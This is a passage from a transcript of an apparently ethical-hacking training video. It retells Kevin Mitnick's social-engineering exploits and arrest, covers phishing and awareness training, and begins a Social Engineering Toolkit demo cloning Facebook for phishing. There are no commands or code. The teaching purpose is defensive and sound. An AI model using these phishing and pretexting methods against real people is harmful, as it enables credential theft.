day.\n\n163\n00:06:50.730 --> 00:06:53.200\nInteresting, saw\nan interview done with him.\n\n164\n00:06:53.200 --> 00:06:56.020\nAnd the gentleman asked him, this was\nnot long after he got out of jail.\n\n165\n00:06:56.020 --> 00:06:58.310\n>> Was that the 60 Minutes interview\nright before he was getting out.\n\n166\n00:06:58.310 --> 00:06:59.278\n>> Yeah.\n>> Like the three or\n\n167\n00:06:59.278 --> 00:07:02.147\nfour days before he was, and they were\ntalking about what I did and everything.\n\n168\n00:07:02.147 --> 00:07:05.962\nHow he says, and\nhe never admits he actually did anything\n\n169\n00:07:05.962 --> 00:07:06.576\nwrong-\n>> Yes.\n\n170\n00:07:06.576 --> 00:07:07.259\n>> Right?\nBut he says, but\n\n171\n00:07:07.259 --> 00:07:09.478\nyou know if I really wanted to\ntrade on this information and\n\n172\n00:07:09.478 --> 00:07:10.939\ndo bad you think I'd be sitting here?\n\n173\n00:07:10.939 --> 00:07:12.690\nI would have bought an island, retired,\nand you never would have found me.\n\n174\n00:07:12.690 --> 00:07:13.242\n>> Absolutely.\n\n175\n00:07:13.242 --> 00:07:14.215\n>> It's a great interview.\n\n176\n00:07:14.215 --> 00:07:15.177\n>> And the guy asked him,\n\n177\n00:07:15.177 --> 00:07:17.720\nhe says, well what attack or\nhack are you the most proud of?\n\n178\n00:07:17.720 --> 00:07:20.330\nAnd of course he, politically correct,\nbut he says, well,\n\n179\n00:07:20.330 --> 00:07:22.120\nI'm not proud of any of them.\n\n180\n00:07:22.120 --> 00:07:24.220\n>> Right.\n>> But the one I was most surprised with\n\n181\n00:07:24.220 --> 00:07:27.420\nthe success was, he had called up,\nI believe it was Nokia, and\n\n182\n00:07:27.420 --> 00:07:28.290\ndon't quote me on the details.\n\n183\n00:07:28.290 --> 00:07:29.634\n>> This is where he gets the plans for\nthe phone?\n\n184\n00:07:29.634 --> 00:07:31.481\nYeah.\n>> And was able to social engineer\n\n185\n00:07:31.481 --> 00:07:32.685\nover the phone-\n>> Motorola,\n\n186\n00:07:32.685 --> 00:07:33.497\nactually\n>> The plans.\n\n187\n00:07:33.497 --> 00:07:34.436\nWas it Motorola?\n\n188\n00:07:34.436 --> 00:07:37.350\nThe plans for this Motorola\nphone that was in development.\n\n189\n00:07:37.350 --> 00:07:39.245\n>> It was the StarTAC,\nif you remember the StarTACs.\n\n190\n00:07:39.245 --> 00:07:40.896\nWhich at the time were, I actually,\n\n191\n00:07:40.896 --> 00:07:43.256\nI remember them because I\nhad one when they came out.\n\n192\n00:07:43.256 --> 00:07:46.350\nThis was like the Star Trek\ncommunicator phone.\n\n193\n00:07:46.350 --> 00:07:47.267\nAnd it was really tiny.\n\n194\n00:07:47.267 --> 00:07:48.230\nIt was made by Motorola.\n\n195\n00:07:48.230 --> 00:07:50.838\nIt was revolutionary at the time because\nwe're talking about the cell phones that\n\n196\n00:07:50.838 --> 00:07:51.570\nwere bricks, right?\n\n197\n00:07:51.570 --> 00:07:54.190\n>> Yes.\nAnd you have self-defense weapons and\n\n198\n00:07:54.190 --> 00:07:56.530\nnuclear devices all in one.\n\n199\n00:07:56.530 --> 00:07:59.918\nYou could radiate a five\nmile area with that battery.\n\n200\n00:07:59.918 --> 00:08:03.372\nBut we went from that to essentially\nthese much smaller phones.\n\n201\n00:08:03.372 --> 00:08:05.677\nAnd the StarTAC phone was that Flip phone,\n\n202\n00:08:05.677 --> 00:08:09.904\nlooked literally like a Star Trek\ncommunicator from the original series, but\n\n203\n00:08:09.904 --> 00:08:14.665\nthey were like $1,000 when they came out,\nridiculous money, back in the 80s.\n\n204\n00:08:14.665 --> 00:08:19.095\nYou're right, cuz he talks about that,\nand he actually socially engineered\n\n205\n00:08:19.095 --> 00:08:23.190\nthe plans for the StarTAC phone from\na girl at Motorola who was there.\n\n206\n00:08:23.190 --> 00:08:25.790\nHe pretended to be one of\nthe engineers working on the project.\n\n207\n00:08:25.790 --> 00:08:29.730\nAnd he tells the story about walking down\nthe street and within ten minutes on his\n\n208\n00:08:29.730 --> 00:08:34.005\nphone between getting coffee and going to\nthe car, he has the plans emailed to him.\n\n209\n00:08:34.005 --> 00:08:35.510\n>> [LAUGH]\n>> And by the time he gets to the office\n\n210\n00:08:35.510 --> 00:08:37.220\nhe's got the plans for the StartTAC.\n\n211\n00:08:37.220 --> 00:08:38.840\n>> Yeah.\n>> Just like crazy stuff.\n\n212\n00:08:38.840 --> 00:08:39.640\n>> And you think about, I mean,\n\n213\n00:08:39.640 --> 00:08:43.420\nthe value of that information to\nthe competitors at the time of Motorola.\n\n214\n00:08:43.420 --> 00:08:44.730\n>> Yeah.\n>> I mean, incredible.\n\n215\n00:08:44.730 --> 00:08:46.299\n>> And if you saw the whole interview.\n\n216\n00:08:47.870 --> 00:08:49.120\nThey were interviewing him.\n\n217\n00:08:49.120 --> 00:08:53.576\nBut at one point at the time they were\nalso interviewing the head of Novell,\n\n218\n00:08:53.576 --> 00:08:55.344\nthe president of Novell, and\n\n219\n00:08:55.344 --> 00:08:59.682\nthey're talking to him, the 60\nMinutes interview or whoever it was.\n\n220\n00:08:59.682 --> 00:09:02.470\nThey're talking to him about,\nhey, you know so this happened.\n\n221\n00:09:02.470 --> 00:09:06.190\nAnd Mitnick's getting ready to get out\njail and, you know, all this stuff.\n\n222\n00:09:06.190 --> 00:09:08.940\nYou'll kind of walk us through\nwhat happened and they talk,\n\n223\n00:09:08.940 --> 00:09:10.960\nthey don't talk about\nthe details of how he hacked.\n\n224\n00:09:10.960 --> 00:09:13.580\nBut he hacked into Novell,\nhe hacked into Microsoft.\n\n225\n00:09:13.580 --> 00:09:16.020\nHe hacked into all the major\ncompanies at the time.\n\n226\n00:09:16.020 --> 00:09:19.800\nAnd they talk about the fact that he did,\nat least Novell claimed,\n\n227\n00:09:19.800 --> 00:09:23.717\na tremendous amount of damage to their,\nnot their infrastructure,\n\n228\n00:09:23.717 --> 00:09:25.760\nhe never actually broke anything.\n\n229\n00:09:25.760 --> 00:09:28.260\nHe stole proprietary information.\n\n230\n00:09:28.260 --> 00:09:32.000\nBut they claim that he did a lot\nof damage to their research and\n\n231\n00:09:32.000 --> 00:09:33.610\ntheir ability to use their products.\n\n232\n00:09:33.610 --> 00:09:37.020\nAnd they show facial recognition\ntechnology in the interview at the time,\n\n233\n00:09:37.020 --> 00:09:40.350\nand he says, something that we're working\non and they show the beginnings of what\n\n234\n00:09:40.350 --> 00:09:43.010\nwould become facial recognition and\nbiometric technology.\n\n235\n00:09:43.010 --> 00:09:46.330\nAnd they explained that he had\nstolen some of this information.\n\n236\n00:09:46.330 --> 00:09:51.946\nAnd then they put up a claim on the screen\nand essentially say based on what Mitnick\n\n237\n00:09:51.946 --> 00:09:57.395\nis accused of doing, he at the time,\nthe largest hacking damages in history,\n\n238\n00:09:57.395 --> 00:10:03.530\nhe was accused of doing $500 million in\ndamage to these companies back in the 80s.\n\n239\n00:10:03.530 --> 00:10:07.330\nI mean, we've talking about billions\nof dollars in real money today, right?\n\n240\n00:10:07.330 --> 00:10:10.022\nBut they accused him of this, and this\nis what he ultimately was tried on and\n\n241\n00:10:10.022 --> 00:10:10.637\nwent to jail on.\n\n242\n00:10:10.637 --> 00:10:13.327\nAnd I'll tell you in a minute how they\nfound him, which is really interesting if\n\n243\n00:10:13.327 --> 00:10:15.631\nyou don't know the story,\nof how they actually caught up with him.\n\n244\n00:10:15.631 --> 00:10:20.500\nBut they essentially accused him of doing\nlike 500 million in damage, but yet\n\n245\n00:10:20.500 --> 00:10:25.010\nhe maintains to this day and all the way\nthrough that I never actually sold or\n\n246\n00:10:25.010 --> 00:10:27.530\ntraded on any of this information.\n\n247\n00:10:27.530 --> 00:10:28.720\nI never made it public.\n\n248\n00:10:28.720 --> 00:10:32.149\nI did it essentially because I could or\nbecause I thought I could or\n\n249\n00:10:32.149 --> 00:10:33.531\nI wanted to see if I could.\n\n250\n00:10:33.531 --> 00:10:35.105\nHe's like a 12-year-old kid, right.\n\n251\n00:10:35.105 --> 00:10:36.030\nWhy did you do it?\n\n252\n00:10:36.030 --> 00:10:38.290\nWell, because it was there and\nI was bored, right.\n\n253\n00:10:38.290 --> 00:10:40.672\nIt's not like he went out and\ndid anything with this information.\n\n254\n00:10:40.672 --> 00:10:42.140\nAnd actually he makes the point,\n\n255\n00:10:42.140 --> 00:10:45.950\nas I said, had I wanted to actually\nbenefit from this, do you really think\n\n256\n00:10:45.950 --> 00:10:49.840\nthat I would have been stupid enough to do\nit in a way that you could have caught me?\n\n257\n00:10:49.840 --> 00:10:53.310\nAnd he makes the point that he never made\nanything from all the hacking activity.\n\n258\n00:10:53.310 --> 00:10:54.720\nHe just did it to do it.\n\n259\n00:10:54.720 --> 00:10:57.300\nBut they went after him,\nthey made an example of him,\n\n260\n00:10:57.300 --> 00:11:00.170\nthey being the federal government,\nand they put him in jail.\n\n261\n00:11:00.170 --> 00:11:04.360\nBut the way they caught him was really\ninteresting, and he talks about this,\n\n262\n00:11:04.360 --> 00:11:06.805\nhe was hacking all the time,\nhe had gotten married.\n\n263\n00:11:06.805 --> 00:11:08.890\nThey profiled this, it's a long interview.\n\n264\n00:11:08.890 --> 00:11:10.460\nYou may have not seen the whole thing, but\n\n265\n00:11:10.460 --> 00:11:14.830\nit's a long 20-minute piece on\nhim as he's getting out of jail.\n\n266\n00:11:14.830 --> 00:11:16.560\nAnd he had gotten married,\nhe talks about this,\n\n267\n00:11:16.560 --> 00:11:20.080\nhe lost his wife to the hacking,\ncuz it was like an addiction.\n\n268\n00:11:20.080 --> 00:11:22.740\nHe got so\ninto it that he basically ignores her,\n\n269\n00:11:22.740 --> 00:11:26.210\nhe winds up getting divorced because\nshe's just fed up and leaves.\n\n270\n00:11:26.210 --> 00:11:30.380\nAnd he's hacking all the time, he's\nsaying he's hacking 15, 20 hours a day,\n\n271\n00:11:30.380 --> 00:11:31.530\nhe's not working any more.\n\n272\n00:11:31.530 --> 00:11:33.060\nAll he's doing is hacking.\n\n273\n00:11:33.060 --> 00:11:36.540\nAnd he's in an apartment and he's on\nthe run and he's in an apartment and\n\n274\n00:11:36.540 --> 00:11:39.610\nhe's hacking, and\nthe FBI figures out where he is.\n\n275\n00:11:39.610 --> 00:11:43.765\nThey triangulate the, at that time\nit was cell phone towers and modems.\n\n276\n00:11:43.765 --> 00:11:45.730\n>> Mm-hm.\n>> And they triangulate where he is based\n\n277\n00:11:45.730 --> 00:11:47.360\non the equipment he's using.\n\n278\n00:11:47.360 --> 00:11:47.960\nThey zero in.\n\n279\n00:11:47.960 --> 00:11:50.510\nThey surround the apartment\nbuilding where he is.\n\n280\n00:11:50.510 --> 00:11:52.850\nAnd they're watching, they're staking\nhim out for a couple of days.\n\n281\n00:11:52.850 --> 00:11:54.680\nAnd then they finally go up.\n\n282\n00:11:54.680 --> 00:11:58.350\nThey knock on the door, and\nhe comes and he answers the door.\n\n283\n00:11:58.350 --> 00:12:01.290\nLike an FBI agent, this is not like\nthey show up with the SWAT team,\n\n284\n00:12:01.290 --> 00:12:04.370\nand they weren't worried about,\nthis was a whole different time.\n\n285\n00:12:04.370 --> 00:12:07.440\nYou weren't worried about people\nblowing themselves up, stuff like that.\n\n286\n00:12:07.440 --> 00:12:08.100\nSo they just show up,\n\n287\n00:12:08.100 --> 00:12:10.530\nthey knock on the door essentially,\nthey've got the place surrounded,\n\n288\n00:12:10.530 --> 00:12:15.090\nhe's not going anywhere, and they say,\nhey, this is who we're looking for.\n\n289\n00:12:15.090 --> 00:12:16.310\nIs this you?\n\n290\n00:12:16.310 --> 00:12:18.065\nAnd he looks at the guy and he denies it.\n\n291\n00:12:18.065 --> 00:12:21.050\nAnd they say, wow, that's funny,\ncuz they have the Wanted poster and\n\n292\n00:12:21.050 --> 00:12:22.470\nthis looks like you.\n\n293\n00:12:22.470 --> 00:12:27.030\nAnd you know, they basically say,\nokay, Mr Mitnick, this is who we are,\n\n294\n00:12:27.030 --> 00:12:28.150\nyou have to come with us.\n\n295\n00:12:28.150 --> 00:12:30.360\nAnd he says, okay, and\nthat's the end of it.\n\n296\n00:12:30.360 --> 00:12:31.920\nBut they find him,\n\n297\n00:12:31.920 --> 00:12:36.210\nexcuse me, they find him because\nhe's online hacking continuously and\n\n298\n00:12:36.210 --> 00:12:38.664\nthey essentially figure out where he is\nand they triangulate and they go get him.\n\n299\n00:12:38.664 --> 00:12:42.820\nHe's sitting in an apartment building in\nthe middle of nowhere just hacking away.\n\n300\n00:12:42.820 --> 00:12:43.780\nSo it's kind of interesting, but\n\n301\n00:12:43.780 --> 00:12:47.090\nyou're playing on human weakness and\njust the ability for people,\n\n302\n00:12:47.090 --> 00:12:51.950\nunfortunately as a human being,\nand again Mike's absolutely right.\n\n303\n00:12:51.950 --> 00:12:53.760\nA lot of times you want\nto do the right thing.\n\n304\n00:12:53.760 --> 00:12:57.110\nSomebody's asked, they look to be in need,\nand you wanna try to help them and we can\n\n305\n00:12:57.110 --> 00:13:02.250\nplay on that to essentially get people\nto give up stuff that they shouldn't.\n\n306\n00:13:02.250 --> 00:13:04.070\nI mean, how often have you\nasked somebody at work, hey,\n\n307\n00:13:04.070 --> 00:13:05.190\nwhat's the password for that thing?\n\n308\n00:13:05.190 --> 00:13:05.810\nI don't remember.\n\n309\n00:13:05.810 --> 00:13:07.600\nAnd they tell you, right?\n\n310\n00:13:07.600 --> 00:13:10.120\nIt's not that they're giving something\naway that you're not supposed to know, but\n\n311\n00:13:10.120 --> 00:13:12.000\nthe reality is our policy is pretty clear.\n\n312\n00:13:12.000 --> 00:13:12.880\nYou're not supposed to give out passwords.\n\n313\n00:13:12.880 --> 00:13:14.570\nSo should you be doing that?\n\n314\n00:13:14.570 --> 00:13:15.350\nNo.\n\n315\n00:13:15.350 --> 00:13:19.090\nAnd what we often find is that when you do\nthat kind of of stuff at work, the problem\n\n316\n00:13:19.090 --> 00:13:21.636\nis not whether you do it at work with\npeople that you know, the problem is you\n\n317\n00:13:21.636 --> 00:13:24.860\ntend to take that behavior and you tend\nto do that in other places, right?\n\n318\n00:13:24.860 --> 00:13:28.310\nAnd so when you're not secure in one\nplace, we often find it's hard for\n\n319\n00:13:28.310 --> 00:13:29.880\nyou to be secure everywhere.\n\n320\n00:13:29.880 --> 00:13:35.650\nAnd that best practice thought process of\nhey, let's lock down that mouth, right?\n\n321\n00:13:35.650 --> 00:13:38.380\nPut the lock and key on there, and\nunfortunately it just doesn't really work.\n\n322\n00:13:38.380 --> 00:13:41.240\nAnd ignorance about social\nengineering is also a problem.\n\n323\n00:13:41.240 --> 00:13:44.220\nAnd one of the biggest issues is\nwe really don't have sufficient\n\n324\n00:13:44.220 --> 00:13:48.860\nsecurity awareness training going on to\nmitigate and to stop these attacks and\n\n325\n00:13:48.860 --> 00:13:50.500\npotentially protect against them.\n\n326\n00:13:50.500 --> 00:13:52.210\nIt's probably the number\none thing that goes on.\n\n327\n00:13:52.210 --> 00:13:56.190\nIf we would just train our people better,\nand give them more knowledge about things,\n\n328\n00:13:56.190 --> 00:13:59.720\nit would be a lot harder for\nthe attackers to do the phishing, and\n\n329\n00:13:59.720 --> 00:14:02.310\nto do all the stuff we've talked\nabout in other episodes or\n\n330\n00:14:02.310 --> 00:14:06.870\nwe'll continue to talk about in coming up,\nor in upcoming episodes.\n\n331\n00:14:06.870 --> 00:14:09.010\nAnd it's really about\nall that kind of stuff.\n\n332\n00:14:09.010 --> 00:14:12.040\nPhishing is probably one of\nthe biggest issues we face today\n\n333\n00:14:12.040 --> 00:14:15.640\nfrom a social engineering perspective\nwith regards to identity theft,\n\n334\n00:14:15.640 --> 00:14:18.360\nwhether it's spear phishing,\nwhaling, whatever it may be.\n\n335\n00:14:18.360 --> 00:14:22.820\nVishing, Voice Over IP phishing,\nall these kind of things.\n\n336\n00:14:22.820 --> 00:14:24.360\nThe problem is we don't educate people.\n\n337\n00:14:24.360 --> 00:14:27.340\nThen it becomes a real challenge for\nus cuz people click on those links.\n\n338\n00:14:27.340 --> 00:14:30.030\nAnd I'm gonna show you what I mean by\nthat in a few minutes when we do a little\n\n339\n00:14:30.030 --> 00:14:30.990\ndemo here for you.\n\n340\n00:14:30.990 --> 00:14:33.500\nWe're gonna show you how\nto socially engineer and\n\n341\n00:14:33.500 --> 00:14:37.570\nshow you what the outcome of that may be\nusing the social engineering toolkit,\n\n342\n00:14:37.570 --> 00:14:42.640\nCali Linux, and we're gonna mirror a\nwebsite and do a little Facebook phishing.\n\n343\n00:14:42.640 --> 00:14:45.480\nWhatever a good acronym for that,\nit's called Facebook phishing.\n\n344\n00:14:45.480 --> 00:14:48.300\nOr fuh-fishing, whatever the case may be.\n\n345\n00:14:48.300 --> 00:14:53.130\nBut lack of security policies,\ninsufficient security awareness training,\n\n346\n00:14:54.280 --> 00:14:57.770\nreally not understanding how\nto communicate effectively\n\n347\n00:14:57.770 --> 00:15:01.220\nto people what the plan is is\nsomething that we wanna think about.\n\n348\n00:15:01.220 --> 00:15:04.590\nSocial engineering is so\neffective because it's really hard for\n\n349\n00:15:04.590 --> 00:15:07.700\npeople to pick up on the fact\nthat that may be what's going on.\n\n350\n00:15:07.700 --> 00:15:11.136\nI know we put up the URL for the\nsocialengineer.org website in the chat,\n\n351\n00:15:11.136 --> 00:15:14.629\nbut can we actually throw the website\nup for a minute on Mike's machine and\n\n352\n00:15:14.629 --> 00:15:15.720\njust take a look at it?\n\n353\n00:15:15.720 --> 00:15:20.531\nThis is probably one of the best\nwebsites that I know about,\n\n354\n00:15:20.531 --> 00:15:27.377\nthere along with Securing the Human,\nwhich is from the, I'm drawing a blank.\n\n355\n00:15:27.377 --> 00:15:29.929\nIn my mind I keep wanting to say NIST,\nbut it's not NIST.\n\n356\n00:15:29.929 --> 00:15:34.765\nFrom the, I can't think of it,\nyou'll look it up in a minute.\n\n357\n00:15:34.765 --> 00:15:37.332\nThey've got a huge online set of\n\n358\n00:15:37.332 --> 00:15:42.286\ntraining modules that are available\nthat we can also, SANS.\n\n359\n00:15:42.286 --> 00:15:43.031\nI couldn't just think.\n\n360\n00:15:43.031 --> 00:15:45.075\nI keep seeing NIST in my mind and\nI know it's SANS and\n\n361\n00:15:45.075 --> 00:15:47.155\nI can't think about what the acronym is.\n\n362\n00:15:47.155 --> 00:15:49.790\nSANS has this great\nsecurity awareness training\n\n363\n00:15:49.790 --> 00:15:51.490\nsolution called Securing the Human.\n\n364\n00:15:51.490 --> 00:15:52.675\nIt's a modular approach.\n\n365\n00:15:52.675 --> 00:15:55.035\nThey've got a bunch of\nreally good stuff up there.\n\n366\n00:15:55.035 --> 00:15:57.501\nYou usually can get access to some of it.\n\n367\n00:15:57.501 --> 00:16:00.110\nSome of it's free but you've got to\nbuy rights to it now to be able to use\n\n368\n00:16:00.110 --> 00:16:01.626\nthe whole program in the organization.\n\n369\n00:16:01.626 --> 00:16:04.093\nBut it's another really great\napproach to the same idea.\n\n370\n00:16:04.093 --> 00:16:10.192\nBut security through education is\njust going to be a good website here.\n\n371\n00:16:10.192 --> 00:16:14.100\nThe security.engineer.org website,\nthey got a bunch of different stuff.\n\n372\n00:16:14.100 --> 00:16:15.180\nThey've got resources.\n\n373\n00:16:15.180 --> 00:16:18.710\nIf you take a look there at the nav bar,\nyou'll see they have a blog.\n\n374\n00:16:18.710 --> 00:16:20.250\nThey've got a podcast.\n\n375\n00:16:20.250 --> 00:16:21.464\nThey got resources.\n\n376\n00:16:21.464 --> 00:16:23.510\nThey got all sorts of stuff going on.\n\n377\n00:16:23.510 --> 00:16:28.450\nIt's a really good set of items and\ninformation for the security professional,\n\n378\n00:16:28.450 --> 00:16:30.160\nfor the ethical hacker to use and\n\n379\n00:16:30.160 --> 00:16:32.290\nto be able to bring to bear\ninside the organization.\n\n380\n00:16:32.290 --> 00:16:35.030\nSo just may wanna think\nabout that as well, but\n\n381\n00:16:35.030 --> 00:16:39.400\nwe think about the phases of social\nengineering and the phases of the attack.\n\n382\n00:16:39.400 --> 00:16:42.700\nAnd we just wanna make sure we're clear on\nthem and we have a sense of what they are.\n\n383\n00:16:42.700 --> 00:16:44.290\nYou're doing research on the company.\n\n384\n00:16:44.290 --> 00:16:47.710\nWe talked a lot in earlier\nepisodes about reconning and\n\n385\n00:16:47.710 --> 00:16:51.810\nfootprinting and figuring out what's\ngoing on, gathering up our ducks,\n\n386\n00:16:51.810 --> 00:16:54.300\nkind of putting them in a row,\ngetting all of that information together.\n\n387\n00:16:54.300 --> 00:16:58.120\nSo researching, selecting our victim,\nwho we're going to target.\n\n388\n00:16:58.120 --> 00:17:00.590\nHey I think out of these 20 people,\nI may want to go try this or\n\n389\n00:17:00.590 --> 00:17:03.380\nthat person, develop that relationship.\n\n390\n00:17:03.380 --> 00:17:06.700\nSo you'll start to talk, start to figure\nout if we can exchange information,\n\n391\n00:17:06.700 --> 00:17:09.590\nand then exploit the relationship\nessentially, right?\n\n392\n00:17:09.590 --> 00:17:12.380\nThis is basically if you\nthink about the logic of it,\n\n393\n00:17:13.410 --> 00:17:17.350\nthis is essentially figuring out who\nwe wanna get to know and then trying to\n\n394\n00:17:17.350 --> 00:17:21.390\ncreate some trust between them and us,\nso that we can exchange information.\n\n395\n00:17:21.390 --> 00:17:24.560\nThis is common sense stuff in the sense\nyou think about it, okay, yeah,\n\n396\n00:17:24.560 --> 00:17:25.880\nthis is how we do it.\n\n397\n00:17:25.880 --> 00:17:27.690\nI mean I always talk to people,\n\n398\n00:17:27.690 --> 00:17:30.400\nget to know people all the time, but\nI'm not always social engineering them.\n\n399\n00:17:30.400 --> 00:17:33.820\nBut the reality is that's\nessentially the skill set, right.\n\n400\n00:17:33.820 --> 00:17:37.250\nI travel a great deal for work as I talk\nabout sometimes, spend a lot of time in\n\n401\n00:17:37.250 --> 00:17:41.370\nairports, spend a lot of time at\nnight in hotel bars, hanging out and\n\n402\n00:17:41.370 --> 00:17:46.160\nhaving a beer and doing work, I mean all\nsorts of people doing that kind of stuff.\n\n403\n00:17:46.160 --> 00:17:47.772\nAnd as I said a lot of the times,\n\n404\n00:17:47.772 --> 00:17:50.380\nI have really gave up years\nago wearing logo wear.\n\n405\n00:17:50.380 --> 00:17:52.290\nI don't advertise who I work for.\n\n406\n00:17:52.290 --> 00:17:53.490\nI don't advertise what I do.\n\n407\n00:17:53.490 --> 00:17:54.840\nPeople ask what I do for a living.\n\n408\n00:17:54.840 --> 00:17:57.100\nI have a very nondescript answer.\n\n409\n00:17:57.100 --> 00:18:01.930\nI look like I could be a scary\nmotorbike [LAUGH] kind of music guy.\n\n410\n00:18:01.930 --> 00:18:03.080\nSo I go with that sometimes.\n\n411\n00:18:03.080 --> 00:18:04.090\nIt works well.\n\n412\n00:18:04.090 --> 00:18:05.370\nI put on my scary face so\n\n413\n00:18:05.370 --> 00:18:06.210\npeople don't talk to me\n>> [LAUGH]\n\n414\n00:18:06.210 --> 00:18:08.150\n>> So it works well for me, but\n\n415\n00:18:08.150 --> 00:18:11.630\nI don't tell people what I really do for\na living.\n\n416\n00:18:11.630 --> 00:18:17.885\nAnd even my kids, my wife,\nwho know what I do, and I love my wife.\n\n417\n00:18:17.885 --> 00:18:21.815\nBut the reality is she still\ndoesn't really get what I do at\n\n418\n00:18:21.815 --> 00:18:23.675\nthe level that she can\nexplain it to her friends,\n\n419\n00:18:23.675 --> 00:18:25.445\nand she's given up trying\ncuz they just don't get it.\n\n420\n00:18:25.445 --> 00:18:27.390\nSo I'm basically the scary computer guy.\n\n421\n00:18:27.390 --> 00:18:28.705\n[LAUGH] That's what I am.\n\n422\n00:18:28.705 --> 00:18:30.560\nI'm the scary spooky computer guy.\n\n423\n00:18:30.560 --> 00:18:31.190\nWhen it is show and\n\n424\n00:18:31.190 --> 00:18:35.290\ntell day, bring in your dad or\nyour mom, career day for school.\n\n425\n00:18:35.290 --> 00:18:38.300\nMy little one would always tell\nher friends that my daddy's\n\n426\n00:18:38.300 --> 00:18:39.730\nthe spooky computer guy.\n\n427\n00:18:39.730 --> 00:18:41.292\nHe hacks into Facebook and stuff.\n\n428\n00:18:41.292 --> 00:18:43.178\n[LAUGH].\nThat's what she would tell her friends,\n\n429\n00:18:43.178 --> 00:18:46.670\nand so I'm the one who would come in and\nwould be that the scary computer guy.\n\n430\n00:18:46.670 --> 00:18:49.021\nAnd that's what all of the friends\ncall me to this day or\n\n431\n00:18:49.021 --> 00:18:51.360\nat least the ones that I know.\n\n432\n00:18:51.360 --> 00:18:56.170\nAnd In addition, my wife scares\n\n433\n00:18:56.170 --> 00:19:00.870\nmy girls with this because I\nhave tweens and/or a teen,\n\n434\n00:19:00.870 --> 00:19:04.250\nand we don't let them on Facebook and\nall that kind of stuff.\n\n435\n00:19:04.250 --> 00:19:07.510\nAnd my wife It's really\nthe police force in this stuff.\n\n436\n00:19:07.510 --> 00:19:11.380\nIt's not me, but\nshe uses the threat of what I do for\n\n437\n00:19:11.380 --> 00:19:15.010\na living on my kids and says listen, even\nif you go, we're going to find out, and\n\n438\n00:19:15.010 --> 00:19:17.530\nif we find out, we're talking away\nthe phone, the whole nine yards.\n\n439\n00:19:17.530 --> 00:19:19.500\nRemember what Daddy does for a living.\n\n440\n00:19:19.500 --> 00:19:20.840\nDaddy find out, right?\n\n441\n00:19:20.840 --> 00:19:22.060\n>> So you're your wife's nightstick.\n\n442\n00:19:22.060 --> 00:19:23.644\n>> I am essentially the heavy.\n\n443\n00:19:23.644 --> 00:19:26.695\n>> [CROSSTALK]\n>> I'm the one who essentially Is used\n\n444\n00:19:26.695 --> 00:19:29.437\nto be the implementation\ntool to scar them.\n\n445\n00:19:29.437 --> 00:19:32.680\nBut she says,\nremember what daddy does for a living.\n\n446\n00:19:32.680 --> 00:19:36.740\nDaddy will find out that you\nare on Facebook or on Twitter or\n\n447\n00:19:36.740 --> 00:19:39.560\nwhatever, cuz that's\nthe talk track in the house.\n\n448\n00:19:39.560 --> 00:19:40.880\nHey, I want to go be on these things.\n\n449\n00:19:40.880 --> 00:19:42.750\nSorry, you're not allowed to.\n\n450\n00:19:42.750 --> 00:19:46.410\nAnd she says, hey, he'll know,\nand if he finds out, you're dead.\n\n451\n00:19:46.410 --> 00:19:47.162\nThat's it, you're done.\n\n452\n00:19:47.162 --> 00:19:48.971\n>> [LAUGH]\n>> So, we're going right to getting\n\n453\n00:19:48.971 --> 00:19:52.820\nrid of everything, and you're living\nin a tent in the middle of the room.\n\n454\n00:19:52.820 --> 00:19:53.688\nAnd you have no privacy.\n\n455\n00:19:53.688 --> 00:19:54.540\nThat's it.\n[LAUGH]\n\n456\n00:19:54.540 --> 00:19:56.260\n>> So we just wanna make sure we're aware\n\n457\n00:19:56.260 --> 00:19:56.990\nof that, right?\n\n458\n00:19:56.990 --> 00:19:59.360\nSo let's go and,\nare we ready to do the demo?\n\n459\n00:19:59.360 --> 00:20:01.002\n>> Sure, yeah.\n>> Just give Mike a second just to get\n\n460\n00:20:01.002 --> 00:20:01.520\nset up.\n\n461\n00:20:01.520 --> 00:20:04.400\nWe wanna actually do this really\ncool demo for you that I've set up.\n\n462\n00:20:04.400 --> 00:20:08.887\nAs I said, we're gonna use the social\nengineering toolkit from Kali Linux.\n\n463\n00:20:08.887 --> 00:20:12.840\nThis is a set of tools that does\na variety of really cool things.\n\n464\n00:20:12.840 --> 00:20:17.290\nWe're gonna go in, and what we actually\nwanna do is go to the Windows 8 VM first.\n\n465\n00:20:17.290 --> 00:20:18.930\n>> Okay.\n>> I think I've got IE open\n\n466\n00:20:18.930 --> 00:20:20.620\nif I'm not mistaken there.\n\n467\n00:20:20.620 --> 00:20:21.550\nOr actually no you know what?\n\n468\n00:20:21.550 --> 00:20:22.880\nWe didn't do it off of there.\n\n469\n00:20:22.880 --> 00:20:23.470\nWe actually did it.\n\n470\n00:20:23.470 --> 00:20:24.000\nI'm sorry.\n\n471\n00:20:24.000 --> 00:20:25.070\nYou know what?\nGive me half a second.\n\n472\n00:20:25.070 --> 00:20:26.080\nWe did it off this machine.\n\n473\n00:20:26.080 --> 00:20:27.070\nI did it off here, remember.\n\n474\n00:20:27.070 --> 00:20:28.640\n>> Okay.\n>> So we're gonna go to you in a minute.\n\n475\n00:20:28.640 --> 00:20:31.610\nBut let me bring up the site we're\ngoing to use over here first,\n\n476\n00:20:31.610 --> 00:20:33.110\nbecause I actually have that here.\n\n477\n00:20:33.110 --> 00:20:35.240\nCan you go to my machine over here for\nme for just a minute?\n\n478\n00:20:36.320 --> 00:20:37.410\nWe're just gonna do that real quick.\n\n479\n00:20:37.410 --> 00:20:38.700\nOkay, so If you look up there.\n\n480\n00:20:38.700 --> 00:20:41.040\nCan you go full-screen so\nwe can actually see the URL?\n\n481\n00:20:41.040 --> 00:20:43.615\nSo if you look at that,\nthat's essentially Facebook, right?\n\n482\n00:20:43.615 --> 00:20:46.270\nAnd it looks like the Facebook site,\nand indeed it is.\n\n483\n00:20:46.270 --> 00:20:49.540\nBut here's the interesting thing,\nif you look up here at the corner,\n\n484\n00:20:49.540 --> 00:20:52.140\nright up here at the URL\nwhat you're gonna find.\n\n485\n00:20:52.140 --> 00:20:53.220\nLet me highlight it.\n\n486\n00:20:53.220 --> 00:20:58.677\nWhat you're going to find, and\nlet me do this, and let me do this,\n\n487\n00:20:58.677 --> 00:21:03.510\nand let me do this, and do that,\n\n488\n00:21:03.510 --> 00:21:07.740\nis that that is the URL that we've\nactually gone to to bring up Facebook.\n\n489\n00:21:07.740 --> 00:21:10.422\nLast time I checked,\nFacebook wasn't hosting locally with us.\n\n490\n00:21:10.422 --> 00:21:13.056\n>> No, no.\n>> Unless you guys got a tremendous deal\n\n491\n00:21:13.056 --> 00:21:16.000\ngoing there on the side and\nI'm not aware of that.\n\n492\n00:21:16.000 --> 00:21:18.560\nSo that's actually the Facebook 